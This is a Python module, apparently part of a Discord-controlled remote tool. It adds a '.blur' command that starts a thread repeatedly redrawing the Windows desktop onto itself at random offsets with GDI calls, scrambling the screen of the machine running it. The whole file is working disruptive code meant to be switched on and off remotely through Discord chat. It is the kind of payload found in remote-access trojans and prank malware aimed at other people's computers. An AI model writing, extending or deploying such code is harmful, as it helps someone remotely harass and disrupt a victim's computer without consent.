import win32gui
import win32con
import ctypes
import random
import threading
from time import sleep
import discord
import pywintypes

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

delay = 0.001
size = 75
is_blurring = False
blur_thread = None

def blur_effect():
    global is_blurring
    hdc = win32gui.GetDC(0)
    while is_blurring:
        try:
            offset_x = random.randint(-550, 550)
            offset_y = random.randint(-550, 550)
            x_pos = int(size / 2) + offset_x
            y_pos = int(size / 2) + offset_y

            win32gui.StretchBlt(
                hdc,
                x_pos,
                y_pos,
                sw - size,
                sh - size,
                hdc,
                0,
                0,
                sw,
                sh,
                win32con.SRCCOPY,
            )
        except pywintypes.error as e:
            print(f"Error: {e.strerror}. Retrying...")
            sleep(0.1)
            continue
        sleep(delay)
    win32gui.ReleaseDC(0, hdc)

async def blur_command(ctx, action=None):
    global is_blurring, blur_thread
    if action == "start":
        if not is_blurring:
            is_blurring = True
            blur_thread = threading.Thread(target=blur_effect)
            blur_thread.start()
            await ctx.send("Blur effect started.")
        else:
            await ctx.send("Blur effect is already running.")
    elif action == "stop":
        if is_blurring:
            is_blurring = False
            blur_thread.join()
            await ctx.send("Blur effect stopped.")
        else:
            await ctx.send("Blur effect is not running.")
    else:
        await ctx.send("Usage: `.blur start` to start the blur effect, `!blur stop` to stop it.")
